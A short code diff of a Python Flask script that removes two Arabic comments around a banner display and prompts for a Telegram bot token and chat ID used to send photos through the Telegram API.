@@ -26,11 +26,9 @@ app = Flask(__name__)
 UPLOAD_FOLDER = 'uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True) 
 
-# هنا مكان إظهار البانر أولاً
 clear()
 banner()
 
-# بعدها يتم أخذ البيانات من المستخدم
 TELEGRAM_TOKEN = input(RESET+'Enter Telegram token: ') 
 TELEGRAM_CHAT_ID = input(RESET+'Enter your Telegram account ID: ') 
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"  
